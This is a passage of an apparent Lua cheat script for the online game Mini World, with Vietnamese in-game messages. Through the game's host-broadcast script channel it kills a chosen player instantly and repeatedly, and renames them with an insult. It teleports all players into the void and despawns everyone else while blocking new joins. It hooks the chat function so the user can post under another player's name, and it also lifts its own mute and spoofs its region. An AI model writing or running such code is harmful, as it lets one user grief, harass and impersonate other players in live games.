        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end)
end

-- 待机动作
function djdz()
    for a = 0, 100000 do
        threadpool:wait(3.0)
        CurMainPlayer:playAct(100210)
    end
end

-- 创造爆爆蛋
function czbbd()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, y / 100, z / 100
    local tdata = {
        [1] = "world",
        [2] = "spawnMob",
        [3] = { new_x, new_y, new_z, 3109, 5, true }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

-- 防止崩溃
function fzbk()
    local BeInvitePanelCtrl, BeInvitePanelModel, BeInvitePanelView = GetInst("MiniUIManager"):GetMVC("BeInvitePanelAutoGen")
    local function BlockInviteEvent()
        ShowGameTipsWithoutFilter("#RThông báo: đã chặn gây treo")
    end
    
    function ShowActorInvite(isInvite) BlockInviteEvent() end
    
    function BeInvitePanelView:InitMessage(content)
        self.title_label:setText("")
        GetInst("MiniUIManager"):CloseUI("BeInvitePanelAutoGen")
        BlockInviteEvent()
    end
end

-- 防止传送
function ycbr()
    function startMapTeleport(AAA) end
end

function xgcm()
ShowTextInputSafe(function(text)
        AccountManager:requestModifyRole(text, 2, 0,false);
    end)
end

function zdtx()
PlayerCenterFrameHeadChange_OnClick(1);
end

function qcwp()
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x, new_y, new_z = x / 100, y / 100, z / 100

-- 计算范围：从主体位置到周围1000格（游戏内单位）
local range = 1000
local tdata = {
    [1] = "world",
    [2] = "despawnItemByBox",
    [3] = {
        new_x - range, new_y - range, new_z - range,  -- 最小点
        new_x + range, new_y + range, new_z + range   -- 最大点
    }
}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end


function zxyj()
    for a = 0, 1000000 do
        threadpool:wait(0.1)
getglobal("AccRideChangeBtn"):Show()
getglobal("AccRideChangeBtn"):SetPoint("right", "AccRideCallBtn", "left", -75, 0)
end
end

function pmwz()
ShowTextInputSafe(function(text)
        tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "createTimer";
    tdata[3] = {""}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "showTimerTips";
    tdata[3] = {{0},1,text,true}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end)
end

function kqqx()
local nameList = { 1, 2, 4, 8, 16,32, 256,512,2048}
        for _, enchantId in ipairs(nameList) do

tdata = {}
    tdata[1] = "player";
    tdata[2] = "setActionAttrState";
    tdata[3] = {AccountManager:getUin(),enchantId,true}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
end

function wsjy()
PermitsCallModuleScript("setSpamPreventionMinutes",0)
PermitsCallModuleScript("setPlayerGamePermits", 0, AccountManager:getUin(), CS_PERMIT_MUTE, false)
PermitsCallModuleScript("setPlayerMute", AccountManager:getUin())
end


function qhrb()
local country = "JP"
gFunc_setCountry(country)
gFunc_setCountryIP(country)
ShowGameTipsWithoutFilter("Đã chuyển sang khu vực Nhật Bản, mọi người hãy cùng chiến đấu đến khi khu vực Nhật không còn ai")
end

function jjsc()
BanItem(CurMainPlayer:getCurToolID());
	getglobal("MItemTipsFrame"):Hide()
	end
	
	
	
	function mczbj()
	function MapEdit_OnUse(player, world, x, y, z, dir)
local isStartMapEdit = MapEditManager:GetIsStartEdit()
			if not isStartMapEdit then 
				local param = {disableOperateUI = true}
				-- GetInst("UIManager"):Open("MapEdit", param)
				if not GetInst("MiniUIManager"):IsShown("MapEditAutoGen") then
					GetInst("MiniUIManager"):OpenUI("MapEditMainFrame", "miniui/miniworld/ugc_mapEdit", "MapEditAutoGen", param)
				end
				standReportEvent("2001", "MINI_MINEMAP_GAME_1", "", "develop_terraineditor")
			else
				MapEditManager:ExcuteCmdWithRBClicked()
                -- if GetInst("UIManager"):GetCtrl("MapEdit") then
                --     GetInst("UIManager"):GetCtrl("MapEdit"):MapEditUseStatistics()
                -- end
				if GetInst("MiniUIManager"):GetCtrl("MapEdit") then
					GetInst("MiniUIManager"):GetCtrl("MapEdit"):MapEditUseStatistics()
				end
			end
end
end

function jqsw()
local pickedActor = CurMainPlayer:GetPickActor()
local commonNameList = {
    "ice_qicaihua_01", "bossblock_room","aotu_06_leishenzhichui","jiguang01"
}

if pickedActor then
    local objid = pickedActor:getObjId()
    local objType = pickedActor:getObjType()
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5200000001314,1}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5200000001314,2}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,520000001314,17}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5200000001314,18}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "mob";
    tdata[2] = "setAtt";
    tdata[3] = {objid,5,21}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    for i = 1, #commonNameList do
    local tdata = {
        [1] = "actor",
        [2] = "playBodyEffectByFile",
        [3] = {objid,commonNameList[i], true}
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    tdata = {}
    tdata[1] = "actor";
    tdata[2] = "changeCustomModel";
    tdata[3] = {objid,[=[skin_38]=]}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
tdata = {}
    tdata[1] = "actor";
    tdata[2] = "setnickname";
    tdata[3] = {objid,"#b#RThiên binh thiên tướng"}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    
    end
    end
    end
    

function wjzxms()

GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

-- 单体秒杀功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng hạ gục tức thì\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止秒杀 =====
            _G.dtms_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng hạ gục tức thì")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启秒杀 =====
            _G.dtms_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.dtms_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.dtms_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu hạ gục tức thì",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần hạ gục tức thì")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu hạ gục tức thì")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                if whitelist[targetUin] then
                    ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
                    _G.dtms_enabled = false  -- 停止本次秒杀
                    return
                end
                ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp hạ gục tức thì")
                
                -- 启动秒杀循环
                threadpool:work(function()
                local pickedActor = CurMainPlayer:GetPickActor()
                        if pickedActor then
                            local objid = pickedActor:getObjId()
                            local objType = pickedActor:getObjType()
                    local myUin = AccountManager:getUin()
                    local loopCount = 0
                    
                    while _G.dtms_enabled do
                        loopCount = loopCount + 1
                        
                        -- 每10次重新施加禁止攻击（防止被清除）
                        if loopCount % 10 == 1 then
                            local keepDisable = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {objid, 32, false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                            end)
                        end
                        
                        -- 强制打开箱子UI
                        local forceBoxUI = {
                            [1] = "player",
                            [2] = "forceOpenBoxUI",
                            [3] = {objid, 797}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, forceBoxUI)
                        end)
                        
                        -- 修改昵称
                        local changeName = {
                            [1] = "actor",
                            [2] = "setnickname",
                            [3] = {objid, '#RChó'}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeName)
                        end)
                        
                        -- 修改模型
                        local changeModel = {
                            [1] = "actor",
                            [2] = "changeCustomModel",
                            [3] = {objid, "mob_3407"}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeModel)
                        end)
                        
                        -- 禁止攻击
                        local disableAttack = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {objid, 32, false}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                        end)
                        
                        -- ===== 设置目标为可攻击状态 =====
                        local setAttackable = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {objid, 64, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable)
                        end)
                        -- ================================
                        
                        -- ===== 清除目标无敌buff =====
                        local clearBuff = {
                            [1] = "buff",
                            [2] = "clearAllBuff",
                            [3] = {objid}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)
                        end)
                        -- ===========================
                        
                        -- 播放特效1
                        local effect1 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {objid, "jiguang01", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, effect1) 
                        end)
                        
                        -- 播放特效2
                        local effect2 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {objid, "aotu_06_leishenzhichui", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, effect2) 
                        end)
                        
                        -- 设置属性
                        local setAttr1 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {objid, 1, 1}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttr1) 
                        end)
                        
                        local setAttr2 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {objid, 1, 2}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttr2) 
                        end)
                        
                        -- 造成伤害
                        
                            
                            local hurt = {
                                [1] = "actor",
                                [2] = "playerHurt",
                                [3] = {targetUin, objid, 1.8e+308, 0}  -- 修正：使用 targetUin
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, hurt) 
                            end)
                       
                        
                        -- 每10次显示一次提示
                        if loopCount % 10 == 0 then
                            ShowGameTipsWithoutFilter("#c00ffffĐã tấn công " .. loopCount .. " lần")
                        end
                        
                        threadpool:wait(0.0001)  -- 修正等待时间
                    end
                    
                    -- ===== 秒杀结束后恢复目标的攻击能力 =====
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {objid, 32, true}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        ShowGameTipsWithoutFilter("#c00ff00Đã khôi phục khả năng tấn công của mục tiêu")
                    end)
                    -- ====================================
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp hạ gục tức thì kết thúc, tổng số lần tấn công " .. loopCount .. " lần")
                end
                end)  -- 结束 threadpool:work
            end  -- 结束 ctrl:EnterFriendHomeBtn_OnClick
        end  -- 结束 elseif
    end  -- 结束 function(userData, btnType)
)  -- 结束 dualBtnBox
end


function zxph()
InitGameAPI()
GameVmTriggerInit()
local playerUin = AccountManager:getUin()

-- 获取准心位置
local ret, posx, posy, posz = GameVM.Player:getAimPos(playerUin)

if ret == ErrorCode.OK then
    -- 准心位置转换为方块坐标
    local centerX = math.floor(posx)
    local centerY = math.floor(posy)
    local centerZ = math.floor(posz)
    
    ShowGameTipsWithoutFilter("#c00ff00Tâm ngắm chỉ tới: " .. centerX .. ", " .. centerY .. ", " .. centerZ)
    ShowGameTipsWithoutFilter("#cFFAA00Phá khu vực 3x3")
    
    -- 破坏3x3区域内的方块
    for dx = -1, 1 do
        for dy = -1, 1 do
            for dz = -1, 1 do
                local blockX = centerX + dx
                local blockY = centerY + dy
                local blockZ = centerZ + dz
                
                local tdata = {
                    [1] = "block",
                    [2] = "destroyBlock",
                    [3] = { blockX, blockY, blockZ, false }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                threadpool:wait(0.01)  -- 稍微延迟，避免发送过快
            end
        end
    end
else
    ShowGameTipsWithoutFilter("#cFF0000Không thể lấy vị trí tâm ngắm")
end
end
function qtxk()
if ClientCurGame:isInGame() and CurWorld and CurWorld:getOWID() and AccountManager:getMultiPlayer() > 0 then
            local num = ClientCurGame:getNumPlayerBriefInfo()
            for i = 1, num do
                local briefInfo = ClientCurGame:getPlayerBriefInfo(i-1)
                if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                    local new_x = x / 100
                    local new_y = y / 100
                    local new_z = z / 100
                    tdata = {}
                    tdata[1] = "player";
                    tdata[2] = "setPosition";
                    tdata[3] = {briefInfo.uin,new_x,-99,new_z}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)   
                end
            end
        end
        end


function yfgb()
tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "createTimer";
    tdata[3] = {""}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "startBackwardTimer";
    tdata[3] = {1,5,false}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

tdata = {}
    tdata[1] = "minitimer2";
    tdata[2] = "showTimerTips";
    tdata[3] = {{0},1,[=[#RPhòng sắp đóng:#B]=],true}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
ShowGameTipsWithoutFilter("OK")


threadpool:wait(5.0)  -- 在协程中等待
 local myUin = AccountManager:getUin()
    
    -- 获取所有玩家并遍历
    local playerCount = ClientCurGame:requireArrayOfAllPlayers()
    for i = 1, playerCount do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
        -- 清除目标玩家
        local removeData = {
            [1] = "world",
            [2] = "despawnActor",
            [3] = { targetUin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, removeData)
        
        tdata = {}
    tdata[1] = "gamerule";
    tdata[2] = "setAllowMidwayJoin";
    tdata[3] = {0}
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
    end
    end
    end

-- ==================== 模仿发言相关 ====================
local nicknameCache = {}

function getNickname(uin)
    if nicknameCache[uin] then return nicknameCache[uin] end
    
    local nickname = nil
    if ClientCurGame and ClientCurGame:isInGame() and CurWorld and CurWorld:getOWID() then
        local num = ClientCurGame:getNumPlayerBriefInfo() or 0
        for i = 1, num do
            local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
            if briefInfo and briefInfo.uin == uin and briefInfo.uin > 1000 and briefInfo.nickname then
                nickname = briefInfo.nickname
                break
            end
        end
    end
    
    if not nickname and GameVM and GameVM.Player then
        local _, wjmc11 = GameVM.Player:getNickname(uin)
        nickname = wjmc11 or nil
    end
    
    if nickname then nicknameCache[uin] = nickname end
    return nickname
end

function ClearNicknameCache()
    nicknameCache = {}
    ShowGameTipsWithoutFilter("Đã xóa bộ nhớ đệm biệt danh, sẽ lấy lại biệt danh người chơi")
end

function MffyByPlayerUin(Uin, Text)
    if not Uin or tonumber(Uin) <= 1000 then
        ShowGameTipsWithoutFilter("#cff0000UIN mô phỏng không hợp lệ, hãy chọn lại!")
        _G.customImitateUin = nil
        return
    end
    
    Text = tostring(Text or "")
    if Text == "" then
        ShowGameTipsWithoutFilter("#cff0000Nội dung phát biểu không được để trống!")
        return
    end
    
    local playerName = getNickname(Uin)
    if not playerName then
        ShowGameTipsWithoutFilter("#cff0000Người chơi đã chọn không tồn tại, không thể phát sóng!")
        _G.customImitateUin = nil
        return
    end
    
    trigger()
    
    if not ScriptSupportTask or not ScriptSupportTask.reportTaskToHost or not SSTASKID then
        ShowGameTipsWithoutFilter("#cff0000Thiếu giao diện phát sóng, không thể gửi tin nhắn!")
        return
    end
    
    local tdata = {
        [1] = "chat",
        [2] = "sendChat",
        [3] = { "#L" .. playerName .. "#n：#n#cffffff" .. Text, 1, 0 }
    }
    pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) end)
end

function SetImitateUin(newUin)
    local validUin = tonumber(newUin) or 0
    local selfUin = AccountManager and AccountManager.getUin and AccountManager:getUin() or 0
    
    if validUin <= 1000 then
        ShowGameTipsWithoutFilter("#cff0000UIN người chơi không hợp lệ! Phải lớn hơn 1000")
        return
    end
    
    if whitelist[validUin] then
        ShowGameTipsWithoutFilter("#RCấm mô phỏng phát ngôn của người chơi VIP", 3)
        return
    end
    
    local playerName = getNickname(validUin)
    if not playerName then
        ShowGameTipsWithoutFilter("#cff0000Người chơi không tồn tại!")
        return
    end
    
    trigger()
    
    if ClientCurGame and ClientCurGame.sendChat and not _G._IsSendChatHooked then
        ClientCurGame.sendChat = function(self, ...)
            local args = {...}
            local Text = tostring(args[1] or "")
            MffyByPlayerUin(_G.customImitateUin, Text)
        end
        _G._IsSendChatHooked = true
    end
    
    _G.customImitateUin = validUin
    if validUin == selfUin then
        ShowGameTipsWithoutFilter("Đã khôi phục phát ngôn của bản thân")
    else
        ShowGameTipsWithoutFilter(playerName .. "#c00ffff Đã chuyển sang mô phỏng phát ngôn của người chơi này (có hiệu lực ngay)")
    end
end

-- 模仿发言
function fzbr()
    _G.customImitateUin = nil
    _G._IsSendChatHooked = false
    
    if ClientCurGame and ClientCurGame.sendChat and not _G._IsSendChatHooked then
        ClientCurGame.sendChat = function(self, ...)
            local args = {...}
            local Text = tostring(args[1] or "")
            MffyByPlayerUin(_G.customImitateUin, Text)
        end
        _G._IsSendChatHooked = true
        ShowGameTipsWithoutFilter("Chặn trò chuyện đã có hiệu lực, hãy chọn người chơi cần mô phỏng từ danh sách thành viên phòng")
    else
        ShowGameTipsWithoutFilter("#cff0000Khởi tạo chặn trò chuyện thất bại! Không tìm thấy giao diện sendChat")
    end
    
    ShowPlayerList(function(uin) SetImitateUin(uin) end, "Mô phỏng phát ngôn")
end

-- 关闭模仿发言
function gbmf()
    _G.customImitateUin = AccountManager:getUin()
    SetImitateUin(AccountManager:getUin())
    ShowGameTipsWithoutFilter("Đã khôi phục phát ngôn của bản thân")
end

-- ==================== 改名框功能封装 ====================
function ShowTextInputSafe(callback, title)
    -- 备份原有按钮回调函数
    local oldModify = NickModifyFrameModifyBtn_OnClick
    local oldModifyAbroad = NickModifyFrameModifyBtn_OnClickCallbackAbroad
    local oldCancel = CancelNickBtn_OnClick

    -- 打开输入弹窗
    getglobal("NickModifyFrame"):Show()

    -- 设置弹窗标题
    local titleCtrl = getglobal("NickModifyFrameTitle")
    if titleCtrl and titleCtrl.setText then
        titleCtrl:setText(title or "Nhập văn bản")
    end

    -- 获取输入框控件，清除原生字数限制
    local editBox = getglobal("NickModifyFrameContentNameEdit")
    if editBox and editBox.setMaxChar then
        -- 直接拉到超大值，不做复原
        editBox:setMaxChar(999999)
    end

    -- 还原原始函数（只恢复按钮事件，不再重置输入框字符限制）
    local function restoreOriginalFunc()
        NickModifyFrameModifyBtn_OnClick = oldModify
        NickModifyFrameModifyBtn_OnClickCallbackAbroad = oldModifyAbroad
        CancelNickBtn_OnClick = oldCancel
        -- 删除了恢复maxChar的代码，不再重置字数限制
    end

    -- 重写确认按钮点击事件
    function NickModifyFrameModifyBtn_OnClick()
        if not editBox then return end
        local inputText = editBox:GetText()
        if inputText == "" then
            ShowGameTipsWithoutFilter("Nội dung nhập không được để trống")
            return
        end
        getglobal("NickModifyFrame"):Hide()
        editBox:Clear()
        restoreOriginalFunc()
        if callback then callback(inputText) end
    end

    -- 海外分支共用确认逻辑
    function NickModifyFrameModifyBtn_OnClickCallbackAbroad()
        NickModifyFrameModifyBtn_OnClick()
    end

    -- 重写取消按钮
    function CancelNickBtn_OnClick()
        getglobal("NickModifyFrame"):Hide()
        restoreOriginalFunc()
    end
end


-- 指定buff
function zdbf()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập ID buff hợp lệ")
            return
        end
        ShowPlayerList(function(uin)
            if whitelist[uin] then
                ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
                return
            end
            local tdata = {
                [1] = "buff",
                [2] = "addBuff",
                [3] = { uin, value, 1, 0 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end, "Buff người chơi")
    end)
end

function gypf()
    ShowPlayerList(function(targetUin)
        ShowTextInputSafe(function(text)
            local value = tonumber(text)
            if not value then
                ShowGameTipsWithoutFilter("Hãy nhập số skin hợp lệ")
                return
            end
            local skinId = "skin_" .. value
            local tdata = {
                [1] = "actor",
                [2] = "changeCustomModel",
                [3] = { targetUin, skinId }
            }
            pcall(function()
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                ShowGameTipsWithoutFilter("#c00ffffĐã đặt cho người chơi " .. targetUin .. " Đặt skin: " .. skinId)
            end)
        end, "Nhập số skin (ví dụ 1 tương ứng skin_1)")
    end, "Chọn người chơi cần đặt skin")
end

-- 指定飞行
function zdfx()
    ShowPlayerList(function(uin)
        local tdata = {
            [1] = "player",
            [2] = "changPlayerMoveType",
            [3] = { uin, 1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Bay")
end

function zdgz()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        CurMainPlayer:setUin(uin)--改观战的目标迷你号
                CurMainPlayer:setSpectatorMode(1)--设置观战
                CurMainPlayer:setUin(AccountManager:getUin())--改观战的目标迷你号
                CurMainPlayer:setSpectatorMode(0)--设置观战
    end, "Chỉ định theo dõi")
end

function zxsw()
-- 获取玩家准心指向的实体objid
local pickedActor = CurMainPlayer:GetPickActor()

if pickedActor then
    local objid = pickedActor:getObjId()
    local objType = pickedActor:getObjType()
    
    print("========== 准心指向 ==========")
    print("对象objid:", objid)
    print("对象类型:", objType)
    
    -- 不管是不是生物，都播放特效
    local commonNameList = {
    "ice_qicaihua_01", "140113_1", "pumpkin_fireworks2", "horse_3437",
    "horse_4506_3", "horse_4662_3","horse_4502","horse_4564_3","horse_4645_3","horse_4616_3","horse_4554_3","horse_3457","horse_4503"
}
    for i = 1, #commonNameList do
    local tdata = {
        [1] = "actor",
        [2] = "playBodyEffectByFile",
        [3] = {objid,commonNameList[i], true}
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    
    
    end
    ShowGameTipsWithoutFilter("#c00ff00Tâm ngắm chỉ vào đối tượng objid: " .. objid .. " đã phát hiệu ứng")
    print("==============================")
else
    print("没有准心指向的对象")
    ShowGameTipsWithoutFilter("#cFF0000Không có đối tượng nào tại tâm ngắm")
end
end
function zdjr()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 举人+禁止移动功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng nhấc người\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止举人 =====
            _G.xr_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng nhấc người")
            
            -- 可选：恢复所有玩家移动
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.xr_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "player"
                            tdata[2] = "setActionAttrState"
                            tdata[3] = {briefInfo.uin, 1, true}  -- true = 恢复移动
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục di chuyển cho tất cả người chơi")
                end
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启举人 =====
            _G.xr_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.xr_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.xr_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu cần nhấc",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần nhấc")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu nhấc người")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
                        _G.xr_enabled = false  -- 停止本次
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu liên tục nhấc người lên đầu mình")
                
                -- 启动举人循环
                threadpool:work(function()
                    local loopCount = 0
                    
                    while _G.xr_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 举人功能：传送到头上 =====
                        local myX, myY, myZ = CurMainPlayer:getPosition(0, 0, 0)
                        local target_x, target_y, target_z = myX / 100, myY / 100 + 4, myZ / 100
                        
                        local tdata1 = {
                            [1] = "player",
                            [2] = "setPosition",
                            [3] = { targetUin, target_x, target_y, target_z }
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1) 
                        end)
                        -- =================================
                        
                        -- ===== 禁止移动功能 =====
                        local tdata2 = {}
